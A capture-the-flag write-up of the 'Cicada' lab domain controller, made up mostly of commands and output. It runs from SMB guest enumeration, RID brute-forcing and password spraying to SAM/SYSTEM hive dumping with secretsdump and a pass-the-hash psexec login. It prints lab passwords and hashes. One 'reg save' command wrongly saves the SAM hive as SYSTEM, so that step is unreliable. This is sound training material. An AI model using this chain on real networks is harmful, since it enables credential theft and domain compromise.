
# CTF Writeup: Cicada

---
## Reconnaissance

An initial scan revealed the following information about the running services on the target system.

```
nmap -n -Pn -sS -p- 10.129.231.149
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 12:23 -0500
Nmap scan report for 10.129.231.149
Host is up (0.024s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
57799/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 105.66 seconds
```

An further scan revealed more detailled information about the running services on the target server.

```
nmap -n -Pn -sSCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,57799 10.129.231.149
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 12:26 -0500
Nmap scan report for 10.129.231.149
Host is up (0.024s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-19 00:26:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-19T00:28:05+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-19T00:28:04+00:00; +6h59m54s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-06-19T00:28:05+00:00; +6h59m55s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-19T00:28:04+00:00; +6h59m54s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
57799/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m54s, deviation: 0s, median: 6h59m54s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-19T00:27:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.62 seconds
```

The scan revealed information about the domainname "cicada.htb" and revealed an hostname of the DC "CICADA-DC.cicada.htb".

```
echo "10.129.231.149 cicada.htb CICADA-DC.cicada.htb CICADA-DC" | tee -a /etc/hosts
```

Enumerated Shares as "guest" user. There seems to be two non-default shares "DEV" & "HR". We only have access to the "HR" Share. Let's check it out!

```
nxc smb cicada.htb -u 'guest' -p '' --shares
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV                             
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL                          Logon server share
```

We accessed the "HR" SMB Share with anonymous autentication and retrieved an .txt file.

```
smbclient \\\\cicada.htb/HR
```

```
cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

We retrieved an potential password.

```
Cicada$M6Corpb*@Lp#nZp!8
```

I then proceeded with enumerating domain users as "guest" user and piped the output into an "users.txt" file.

```
nxc smb cicada.htb -u 'guest' -p '' --rid-brute > users.txt
```

Formatted the wordlist properly and stored it inside an "newusers.txt" file for nxc spraying.

```
grep "SidTypeUser" users.txt | cut -d '\' -f2 | cut -d ' ' -f1 > newusers.txt
```

I then proceeded with spraying creds and gained valid credentials.

```
nxc winrm cicada.htb -u newusers.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

```
michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

Since I wasn't able get initial access with those credentials. I used them to enumerate LDAP further.

```
ldapsearch -H "ldap://cicada.htb" -D michael.wrightson@cicada.htb -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "dc=cicada,dc=htb" "*" > ldapsearch.txt
```

I searched in the description of users and found the following password:

```
cat ldapsearch.txt | grep description
Just in case I forget my password is aRt$Lp#7t*VQ!3
```

Saved it in an passwords.txt file with the other password.

```
aRt$Lp#7t*VQ!3
Cicada$M6Corpb*@Lp#nZp!8
```

I ran the following command and found new creds.

```
nxc smb cicada.htb -u users.txt -p passwords.txt --continue-on-success
```

```
david.orelious:aRt$Lp#7t*VQ!3
```

I utilized smbmap to check if we have write perms on the "DEV" Share with this user.

```
smbmap -H cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3'
```

We do! Let's check it out.

In the SMB Share was an .ps1 script which provided us with new credentials.

```
emily.oscars:Q!3@Lp#M6b*7t*Vt
```

I sprayed credentials and found out that those creds are valid and we can utilize evil-winrm to connect to the DC.

```
nxc winrm cicada.htb -u users.txt -p passwords.txt --continue-on-success
```

Connected to CICADA-DC

```
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'                                             
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
```

Retrieved user.txt in C:\Users\emily.oscars\Desktop

```
969c7864394eb8163c4dfa50b8a79d1e
```

I saw that our current user has the "SeBackupPrivilege" enabled, which means we should be able to retrieve the SAM & SYSTEM File out of the registry.

```
whoami /all
```

```
reg save hklm\sam c:\Temp\SAM
```

```
reg save hklm\sam c:\Temp\SYSTEM
```

I utilized the in-built function of evil-winrm "download" to get the files onto my local machine.

```
download SAM
download SYSTEM
```

We can now use secretsdump to dump hashes out of the memory.

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -sam SAM local
```

We gained the NTLM Hash of the Administrator User and comprimised CICADA-DC

```
impacket-psexec Administrator@cicada.htb -hashes aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341
```

Retrieved root.txt in C:\Users\Administrator\Desktop

```
a376a4ee52c1d216beb83774b910295e
```